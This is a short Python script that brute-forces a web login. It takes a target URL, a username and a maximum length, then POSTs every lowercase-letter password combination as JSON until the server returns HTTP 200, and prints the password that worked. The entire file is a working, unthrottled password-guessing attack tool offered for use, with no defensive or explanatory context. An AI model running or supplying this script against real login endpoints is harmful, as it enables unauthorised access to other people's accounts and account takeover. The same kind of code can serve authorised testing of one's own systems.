import requests
import itertools
import argparse

parser = argparse.ArgumentParser(description="Brute force password length.")
parser.add_argument("-n", type=int, required=True, help="Maximum length of the password to try")
parser.add_argument("-url", type=str, required=True, help="URL of the login endpoint")
parser.add_argument("-username", type=str, required=True, help="Username for the login")
args = parser.parse_args()

characters = "abcdefghijklmnopqrstuvwxyz"
max_length = args.n 

url = args.url
username = args.username

headers = {
    "Content-Type": "application/json"
}

for length in range(1, max_length + 1):
    for combination in itertools.product(characters, repeat=length):
        password = ''.join(combination)
        payload = {
            "username": username,
            "password": password
        }

        response = requests.post(url, json=payload, headers=headers)
        
        if response.status_code == 200:
            print(f"\nLogin successful with password: {password}")
            exit()
        else:
            print(f"\rLogin failed with password: {password}", end='')
            # print(f"Login failed with password: {password}")

print("\nAll attempts failed.")
